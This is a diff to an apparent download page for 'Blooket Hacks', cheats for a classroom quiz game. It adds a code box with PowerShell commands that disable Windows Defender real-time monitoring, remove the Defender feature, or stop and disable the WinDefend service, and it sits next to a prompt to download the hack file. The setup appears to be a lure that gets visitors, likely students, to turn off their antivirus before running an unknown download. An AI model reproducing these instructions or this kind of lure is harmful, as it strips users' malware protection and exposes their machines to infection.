@@ -272,9 +272,17 @@
                 </button>
             </div>
             <div class="code-container">
-                <pre id="codeSnippet">Blooket Hacks file will be downloaded when you click the button above.</pre>
-            </div>
-        </div>
+    <pre id="codeSnippet">
+Powershell Command to stop real-time-protection:
+Set-MpPreference -DisableRealtimeMonitoring
+
+Powershell Command to remove defender completely:
+Remove-WindowsFeature Windows-Defender, Windows-Defender-GUI
+
+Or this Powershell Command to remove defender completely:
+Get-Service WinDefend | Stop-Service -PassThru | Set-Service -StartupType Disabled
+    </pre>
+</div>
 
         <div class="mt-8 text-center text-sky-200/70 text-sm">
             <p>Click the download button to get your Blooket Hacks file</p>
